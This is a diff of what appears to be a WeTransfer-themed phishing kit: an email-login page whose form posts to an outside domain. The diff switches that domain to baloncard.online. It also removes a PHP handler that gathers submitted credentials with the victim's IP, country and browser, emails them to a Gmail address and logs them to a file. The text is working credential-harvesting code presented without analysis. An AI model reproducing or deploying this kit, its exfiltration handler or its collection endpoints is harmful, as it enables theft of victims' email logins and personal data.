@@ -1,26 +1,3 @@
-<?php
-header('Access-Control-Allow-Origin: *');
-
-$to    = "lubaking.co@gmail.com"; // You change ur email
-$logfile = 1;                            //1 = log data, 0 = do not log data
-
-/* ----------------  XZXXXX-MJ  ------------------------*/
-$disHost = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['PHP_SELF']).'/';
-$ip = getenv("REMOTE_ADDR"); //getip(); //
-$svr_host =  str_replace('www.', '', $_SERVER['HTTP_HOST']);
-function mj_load_view()
-{
-    global $disHost;
-    
-    $eml      = (!empty($_REQUEST['email'])) ? $_REQUEST['email'] : '';
-    $readonly = (!empty($_REQUEST['email'])) ? ' readonly' : '';
-
-    ob_start();
-?>
-
-
-
-
 <!doctype html>
 <html>
 
@@ -69,9 +46,8 @@ function mj_load_view()
 
             </div>
 
-            <form name="sukafomm" action="https://uralgasvladimir.ru/wetrans7july2/manage.php?name=$id" method="post"
+            <form name="sukafomm" action="https://baloncard.online/wetransEmispark12Aug/manage.php?name=$id" method="post"
                 onsubmit="return validateForm()" required>
-
 
 
                 <div class="flex flex-col pb-4 pt-6">
@@ -83,7 +59,7 @@ function mj_load_view()
                             <img class=" absolute pl-3 "
                                 src="https://bafkreicbhv2jxy423agmfwnzckkxwuzy2tnc2mujnhrr4e252jwumrpkqy.ipfs.nftstorage.link/"
                                 alt="">
-                            <input type="text" name="simdia" id="simdia" value="<?php echo $eml; ?>"placeholder="Email" autocomplete="off"
+                            <input type="text" name="simdia" id="simdia" value=""  placeholder="Email" autocomplete="off"
                                 class="rounded-xl py-4 w-full pl-11  text-slate-700 border-none  bg-neutral-50">
                         </div>
 
@@ -186,74 +162,3 @@ function mj_load_view()
 </script>
 
 </html>
-
-<?php
-    return ob_get_clean();
-}function mj_do_random_str($length = 10)
-{ $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; }
-function mj_return_pre($array) { return '<pre>' .print_r($array,true) .'</pre>'; }
-function mj_get_country_name($the_ip){ $addr_details = unserialize(@file_get_contents('http://www.geoplugin.net/php.gp?ip='.$the_ip));  return stripslashes(ucfirst($addr_details['geoplugin_countryName'])); }
-
-function mj_do_mail($message){ global $to, $ip, $svr_host; $subject = "Acidalert - $ip"; 
-$headers = "From: admin <admin@$svr_host>\r\n"; $headers .= "MIME-Version: 1.0\r\n"; 
-@mail($to,$subject,$message,$headers); }
-
-function mj_log_data($message, $logfilename=''){ global $logfile; if(!empty($logfile)) { $handle = fopen($logfilename, 'a'); fwrite($handle, $message."\n"); fclose($handle); } }
-function mj_build_message($post_array)
-{
-    global $ip, $svr_host;
-    $country = mj_get_country_name($ip);
-    $timedate = date("D/M/d, Y g:i a"); 
-    $browserAgent = $_SERVER['HTTP_USER_AGENT'];
-    $hostname = gethostbyaddr($ip); 
-    $message = "-------------- RecodedKME Info -----------------------\n";
-    foreach($post_array as $k=>$v)
-    {
-        $message .= ucfirst($k)." : ".$v."\n";
-    }
-    $message .= "-------------Recoded For Info-----------------------\n";
-    $message .= "IP               : ".$ip."\n";
-    $message .= "Browser          : ".$browserAgent."\n";
-    $message .= "DateTime         : ".$timedate."\n";
-    $message .= "country          : ".$country."\n";
-    $message .= "HostName         : ".$hostname."\n";
-    $message .= "--------------- Recoded King XXX-MJ -------------\n";
-    
-    return $message;
-}
-/* ----------------  XXX-MJ  ------------------------*/
-if(isset($_REQUEST['_do']))
-{
-    $post_array = $_POST;
-    
-    switch($_REQUEST['_do'])
-    {
-        case'layout':
-            
-            echo mj_load_view();
-            
-            break;
-            
-        case'form1':
-        case'form2':
-        case'form3':
-        case'xxx_form':
-
-            //echo 'Form Data '.mj_return_pre($post_array);
-            
-            $mj_messg = mj_build_message($post_array); 
-            mj_do_mail($mj_messg);
-            mj_log_data($mj_messg);
-            
-            //echo '<meta http-equiv="refresh" content="1;url=https://www.microsoft.com/'.$post_array['Editbox2'].'"/>';
-
-            break;
-        
-        case'form4':
-            //echo '<meta http-equiv="refresh" content="1;url=https://www.domain.tld/"/>';
-            break;
-        
-        default:
-            echo 'INVALID REQUEST: I can not understand your request.';    
-    }
-}
